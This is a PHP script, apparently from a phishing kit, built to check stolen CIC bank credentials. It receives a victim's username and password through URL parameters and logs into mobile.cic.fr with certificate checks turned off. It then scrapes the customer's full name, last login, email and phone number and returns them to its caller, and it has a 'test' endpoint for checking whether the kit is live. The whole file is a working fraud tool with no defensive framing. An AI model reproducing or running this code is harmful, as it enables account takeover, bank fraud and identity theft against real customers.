<?php
//      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//                         No Need to Edit Below This Line
//                                Made in 2014                                
//      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

error_reporting(0);
$remote=0;

if(isset($_GET['test'])){
    print " readyforaction ";
    exit;
}
if(isset($_GET['stats'])){
    $remote=1;
	$page=$_GET['page'];
	$ip=$_GET['ip'];
    $user=$_GET['user'];
	$pass=$_GET['pass'];
	$fullname=$_GET['fullname'];
	$lastlog=$_GET['lastlog'];
	$email=$_GET['email'];
	$email2=$_GET['email2'];
	$phone=$_GET['phone'];
}

$cookie = $ip . ".txt";
$agent = $_SERVER['HTTP_USER_AGENT'];
function doRequest($method, $url, $referer, $agent, $cookie, $vars) {
    $ch=curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if($referer != "") {
	curl_setopt($ch, CURLOPT_REFERER, $referer);
    }
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
    }
    if (substr($url, 0, 5) == "https") {
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
    }
    $str = curl_exec($ch);
    curl_close($ch);
    if ($str) {
        return $str;
    } else {
        return curl_error($ch);
    }
}

function get($url, $referer, $agent, $cookie) {
    return doRequest('GET', $url, $referer, $agent, $cookie, 'NULL');
}

function post($url, $referer, $agent, $cookie,  $vars) {
    return doRequest('POST', $url, $referer, $agent, $cookie, $vars);
}

// Script Login
if($page=="first"){

    if(file_exists($cookie)){
	@unlink($cookie);
    }

	$reffer='https://mobile.cic.fr/l/fr/identification/default.cgi';
	$url='https://mobile.cic.fr/l/fr/identification/default.cgi';
    $vars='_cm_url=%2Fl%2Ffr%2Fbanque%2Fsituation_financiere.cgi&_cm_idtype=smart&_cm_langue=fr&_cm_user='.urlencode($user).'&_cm_pwd='.urlencode($pass).'&x=15&y=18';
    $str=post($url, $reffer, $agent, $cookie, $vars);
	
	$url2='https://mobile.cic.fr/l/fr/banque/situation_financiere.cgi';
	$str=get($url2, '', $agent, $cookie);
	
	$firsterror="1";
	
    if (strpos($str, "deconnexion.cgi") != false){
	$firsterror="0";
	
	$fullname=substr($str, strpos($str, 'id="e_identification_ok')+1,500);
	$fullname=substr($fullname, strpos($fullname, '<strong>')+8,100);
	$fullname=substr($fullname, 0, strpos($fullname, "</"));

	$lastlog=substr($str, strpos($str, 'id="e_identification_ok')+1,1000);
	$lastlog=substr($lastlog, strpos($lastlog, 'connexion le')+12,100);
	$lastlog=substr($lastlog, 0, strpos($lastlog, "&nbsp;"));

	$url='https://mobile.cic.fr/l/fr/banque/coordonnees_personnelles.aspx';
	$str=get($url, '', $agent, $cookie);

	$email=substr($str, strpos($str, 'Votre e-mail</th><td')+20,500);
	$email=substr($email, strpos($email, '>')+1,200);
	$email=substr($email, 0, strpos($email, "</td"));
	$semail=substr($email,0,1);
	$email2="";
	if($semail == "*") {
    $email="";
	$email2=substr($str, strpos($str, 'Votre e-mail</th><td')+20,500);
	$email2=substr($email2, strpos($email2, '>')+1,200);
	$email2=substr($email2, 0, strpos($email2, "</td"));
	}
	if (strpos($email, "votre adresse e-mail") != false){
	$email="";
	}
	
	$phone=substr($str, strpos($str, 'phone mobile</th><td')+20,500);
	$phone=substr($phone, strpos($phone, '>')+1,200);
	$phone=substr($phone, 0, strpos($phone, "</td"));
	$phone=str_replace("+","00",$phone);
	$phone=str_replace("\\","", $phone);
	$phone=str_replace("&#233;","é", $phone);
    }
	
    if($remote==1){
	print urlencode("startonthisfuckingpoint&firsterror=$firsterror&fullname=$fullname&lastlog=$lastlog&email=$email&email2=$email2&phone=$phone&endonthisfuckingpoint");
  }
  
  if($firsterror=="0"){
   @unlink($cookie);
  }
}
?>